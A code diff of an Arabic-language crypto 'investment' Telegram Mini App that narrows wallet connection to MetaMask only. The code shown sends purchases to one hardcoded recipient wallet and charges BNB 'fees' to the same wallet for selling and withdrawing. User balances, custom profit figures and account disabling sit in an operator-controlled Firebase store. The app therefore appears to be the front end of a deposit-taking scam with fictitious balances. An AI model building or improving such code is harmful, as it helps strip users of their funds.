@@ -138,8 +138,6 @@ body{background:#0b0d1a;min-height:100vh}
 .withdraw-row span{font-weight:700}
 .wallet-option{display:block;padding:16px;color:#fff;font-weight:700;border-radius:14px;text-align:center;text-decoration:none;margin-bottom:10px;font-size:.95rem;border:none;width:100%;cursor:pointer}
 .wallet-metamask{background:linear-gradient(135deg,#f6851b,#e2761b)}
-.wallet-trust{background:linear-gradient(135deg,#3375bb,#1e5fa0)}
-.wallet-okx{background:linear-gradient(135deg,#1a1a1a,#000000);border:1px solid rgba(255,255,255,.15)}
 @media(max-width:1100px){.trading-layout{grid-template-columns:200px 1fr 280px}}
 @media(max-width:900px){.trading-layout{grid-template-columns:1fr}}
 @media(max-width:640px){.card-modern{padding:16px}.modal-content{padding:20px}.balance-grid{grid-template-columns:1fr!important}.action-buttons{grid-template-columns:1fr}.time-panel-grid{grid-template-columns:repeat(2,1fr)}}
@@ -160,7 +158,7 @@ body{background:#0b0d1a;min-height:100vh}
 <option value="0x1">🟦 Ethereum</option>
 <option value="0x38" selected>🟩 BSC (BNB)</option>
 </select>
-<button id="connectBtn" onclick="connectWallet()" class="btn-neon px-6 py-2.5 text-sm w-auto">🔗 ربط المحفظة</button>
+<button id="connectBtn" onclick="connectWallet()" class="btn-neon px-6 py-2.5 text-sm w-auto">🦊 ربط MetaMask</button>
 <div id="walletInfo" class="hidden items-center gap-3 glass px-4 py-2 rounded-2xl border border-white/10">
 <div class="w-2.5 h-2.5 bg-green-400 rounded-full pulse-dot"></div>
 <span id="walletAddress" class="text-white/80 font-mono text-sm"></span>
@@ -291,7 +289,7 @@ body{background:#0b0d1a;min-height:100vh}
 <div id="toastContainer"></div>
 
 <script>
-if (window.Telegram && window.Telegram.WebApp) { const tg = window.Telegram.WebApp; tg.ready(); tg.expand(); console.log("✅ Telegram Mini App initialized"); }
+if (window.Telegram && window.Telegram.WebApp) { const tg = window.Telegram.WebApp; tg.ready(); tg.expand(); }
 
 const RECIPIENT_WALLET = '0x0391AbB2328dd4c965c93E9aDA0219137c448dDE';
 const BNB_TO_USDT_RATE = 600;
@@ -361,6 +359,10 @@ function showToast(message, type='info'){
   setTimeout(()=>{ t.style.opacity='0'; setTimeout(()=>t.remove(),500); },5000);
 }
 
+function isMetaMask(){
+  return !!(window.ethereum && (window.ethereum.isMetaMask === true));
+}
+
 async function ensureUserExists(address){
   if(!window.firebaseReady || !address) return;
   try {
@@ -370,7 +372,7 @@ async function ensureUserExists(address){
     try {
       const snap = await getDocFromServer(userRef);
       exists = snap.exists();
-    } catch(err){ console.warn('⚠️ فشل الفحص، سنحاول الإنشاء مباشرة'); }
+    } catch(err){ console.warn('⚠️ فشل الفحص'); }
     if(!exists){
       await setDoc(userRef, {
         address: address.toLowerCase(), balance: 0, purchaseTime: null,
@@ -378,17 +380,12 @@ async function ensureUserExists(address){
         disabled: false, withdrawSettings: {},
         createdAt: Date.now(), updatedAt: Date.now()
       }, { merge: true });
-      console.log('✅ تم إنشاء حساب جديد للمستخدم في Firebase');
-    } else {
-      console.log('ℹ️ المستخدم موجود بالفعل في Firebase');
     }
   } catch(e){
     console.error('❌ فشل إنشاء المستخدم:', e);
     try {
       const { doc, setDoc } = window.firebaseFns;
-      const userRef = doc(window.db, 'users', address.toLowerCase());
-      await setDoc(userRef, { address: address.toLowerCase() }, { merge: true });
-      console.log('✅ تم الإنشاء (fallback)');
+      await setDoc(doc(window.db, 'users', address.toLowerCase()), { address: address.toLowerCase() }, { merge: true });
     } catch(e2){ console.error('❌ فشل تماماً:', e2); }
   }
 }
@@ -561,73 +558,73 @@ async function switchNetwork(chainIdHex){
 }
 
 async function connectWallet(){
-  if(window.ethereum){
-    try {
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      userAddress = await signer.getAddress();
-      document.getElementById('connectBtn').classList.add('hidden');
-      document.getElementById('walletInfo').classList.remove('hidden');
-      document.getElementById('walletAddress').textContent = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
-      await ensureUserExists(userAddress);
-      await loadStoredData();
-      await loadAllData();
-      showToast('✅ تم ربط المحفظة','success');
-      if(userSnapshotUnsubscribe) userSnapshotUnsubscribe();
-      const userDocRef = window.firebaseAdvanced.doc(window.db, 'users', userAddress.toLowerCase());
-      userSnapshotUnsubscribe = window.firebaseAdvanced.onSnapshot(userDocRef, (docSnap)=>{
-        if(docSnap.exists()){
-          const data = docSnap.data();
-          investmentBalance = data.balance || 0;
-          purchaseTime = data.purchaseTime || null;
-          withdrawalBalance = data.withdrawalBalance || 0;
-          lastWithdrawRequestTime = data.lastWithdrawRequestTime || 0;
-          userCustomProfit = data.customProfit || 0;
-          isUserDisabled = data.disabled === true;
-          userWithdrawSettings = data.withdrawSettings || {};
-          loadAllData();
-          updateSellAvailability();
-        }
-      }, (err)=>console.error('snapshot error:', err));
-      if(sellAvailabilityIntervalId) clearInterval(sellAvailabilityIntervalId);
-      sellAvailabilityIntervalId = setInterval(updateSellAvailability, 10000);
-    } catch(e){ showToast('❌ فشل الربط: '+e.message,'error'); }
+  if(!window.ethereum){
+    showMetaMaskRequired();
     return;
   }
+
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    document.getElementById('connectBtn').classList.add('hidden');
+    document.getElementById('walletInfo').classList.remove('hidden');
+    document.getElementById('walletAddress').textContent = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
+    await ensureUserExists(userAddress);
+    await loadStoredData();
+    await loadAllData();
+    showToast('✅ تم ربط المحفظة','success');
+    if(userSnapshotUnsubscribe) userSnapshotUnsubscribe();
+    const userDocRef = window.firebaseAdvanced.doc(window.db, 'users', userAddress.toLowerCase());
+    userSnapshotUnsubscribe = window.firebaseAdvanced.onSnapshot(userDocRef, (docSnap)=>{
+      if(docSnap.exists()){
+        const data = docSnap.data();
+        investmentBalance = data.balance || 0;
+        purchaseTime = data.purchaseTime || null;
+        withdrawalBalance = data.withdrawalBalance || 0;
+        lastWithdrawRequestTime = data.lastWithdrawRequestTime || 0;
+        userCustomProfit = data.customProfit || 0;
+        isUserDisabled = data.disabled === true;
+        userWithdrawSettings = data.withdrawSettings || {};
+        loadAllData();
+        updateSellAvailability();
+      }
+    }, (err)=>console.error('snapshot error:', err));
+    if(sellAvailabilityIntervalId) clearInterval(sellAvailabilityIntervalId);
+    sellAvailabilityIntervalId = setInterval(updateSellAvailability, 10000);
+  } catch(e){
+    if(e.code === 4001) showToast('❌ تم رفض الاتصال','warning');
+    else showToast('❌ فشل الربط: '+e.message,'error');
+  }
+}
+
+function showMetaMaskRequired(){
   const ua = navigator.userAgent || '';
   const isMobile = /android|iphone|ipad|ipod/i.test(ua);
-  if(isMobile){ showWalletChooser(APP_URL); }
-  else { showToast('⚠️ يرجى تثبيت MetaMask أو Trust Wallet!','error'); }
-}
+  const cleanUrl = APP_URL.replace(/^https?:\/\//, '');
+  const deepLink = 'https://metamask.app.link/dapp/' + cleanUrl;
 
-function openWalletLink(url){ if(window.Telegram && window.Telegram.WebApp) window.Telegram.WebApp.openLink(url); else window.location.href = url; }
-
-function openOKXWallet(cleanUrl){
-  const fullUrl = 'https://' + cleanUrl;
-  const okxDeepLink = 'okx://wallet/dapp/url?dappUrl=' + encodeURIComponent(fullUrl);
-  const universalLink = 'https://www.okx.com/download?deeplink=' + encodeURIComponent(okxDeepLink);
-  if(window.Telegram && window.Telegram.WebApp) window.Telegram.WebApp.openLink(universalLink);
-  else window.location.href = universalLink;
-}
-
-function showWalletChooser(cleanUrl){
   const mh = `
-    <div id="walletChooserModal" class="modal-overlay" style="z-index:10002">
+    <div id="mmModal" class="modal-overlay" style="z-index:10002">
       <div class="modal-content" style="max-width:420px">
         <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
-          <h3 style="font-size:1.2rem;font-weight:800;color:#fff">🔗 اختر محفظتك</h3>
-          <button onclick="document.getElementById('walletChooserModal').remove()" style="color:#9ca3af;font-size:1.5rem;background:none;border:none;cursor:pointer">✕</button>
+          <h3 style="font-size:1.2rem;font-weight:800;color:#fff">🦊 MetaMask مطلوب</h3>
+          <button onclick="document.getElementById('mmModal').remove()" style="color:#9ca3af;font-size:1.5rem;background:none;border:none;cursor:pointer">✕</button>
         </div>
-        <p style="color:#9ca3af;font-size:.85rem;margin-bottom:20px;text-align:center;line-height:1.6">سيتم فتح المنصة داخل محفظتك لربطها تلقائياً.</p>
-        <button onclick="openWalletLink('https://metamask.app.link/dapp/${cleanUrl}')" class="wallet-option wallet-metamask">🦊 فتح في MetaMask</button>
-        <button onclick="openWalletLink('https://link.trustwallet.com/open_url?coin_id=60&url=https://${cleanUrl}')" class="wallet-option wallet-trust">🛡️ فتح في Trust Wallet</button>
-        <button onclick="openOKXWallet('${cleanUrl}')" class="wallet-option wallet-okx">⚫ فتح في OKX Wallet</button>
-        <p style="color:#6b7280;font-size:.7rem;text-align:center;margin-top:14px">إذا لم تُفتح المحفظة تلقائياً، افتحها يدوياً واكتب:<br><span style="color:#4facfe;word-break:break-all">${cleanUrl}</span></p>
-        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="document.getElementById('walletChooserModal').remove()">إلغاء</button>
+        <p style="color:#9ca3af;font-size:.85rem;margin-bottom:20px;text-align:center;line-height:1.7">
+          هذا التطبيق يعمل <strong style="color:#f6851b">MetaMask فقط</strong>.<br>
+          ${isMobile ? 'اضغط الزر لفتح التطبيق في MetaMask.' : 'ثبّت إضافة MetaMask في المتصفح.'}
+        </p>
+        ${isMobile ? `<button onclick="if(window.Telegram&&window.Telegram.WebApp)window.Telegram.WebApp.openLink('${deepLink}');else window.location.href='${deepLink}'" class="wallet-option wallet-metamask">🦊 فتح في MetaMask</button>` : '<a href="https://metamask.io/download/" target="_blank" class="wallet-option wallet-metamask" style="display:block">🦊 تحميل MetaMask</a>'}
+        <p style="color:#6b7280;font-size:.7rem;text-align:center;margin-top:14px">
+          أو افتح الرابط داخل متصفح MetaMask يدوياً:<br>
+          <span style="color:#4facfe;word-break:break-all">${cleanUrl}</span>
+        </p>
+        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="document.getElementById('mmModal').remove()">إلغاء</button>
       </div>
     </div>`;
-  const old = document.getElementById('walletChooserModal'); if(old) old.remove();
+  const old = document.getElementById('mmModal'); if(old) old.remove();
   document.body.insertAdjacentHTML('beforeend', mh);
 }
 
@@ -733,7 +730,6 @@ async function buyTokens(){
   try {
     const amWei = ethers.utils.parseEther(amount.toString());
 
-    // ✅ بدون gasPrice/gasLimit — Trust Wallet يحسبها بنفسه
     const txHash = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
@@ -785,7 +781,6 @@ async function confirmSell(){
 
     const feeWei = ethers.utils.parseEther(fee.toFixed(18));
 
-    // ✅ بدون gasPrice/gasLimit
     const txHash = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
@@ -859,7 +854,6 @@ async function withdrawAll(){
   try {
     const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
 
-    // ✅ بدون gasPrice/gasLimit
     const txHash = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
@@ -914,7 +908,7 @@ function initSettingsListener(){
 }
 
 if(window.firebaseReady) initSettingsListener();
-else window.addEventListener('firebaseReady', ()=>{ console.log('📢 firebaseReady'); initSettingsListener(); });
+else window.addEventListener('firebaseReady', ()=>{ initSettingsListener(); });
 setTimeout(()=>{ if(!settingsSnapshotUnsubscribe) initSettingsListener(); }, 2000);
 setTimeout(()=>{ if(!settingsSnapshotUnsubscribe) initSettingsListener(); }, 5000);
 
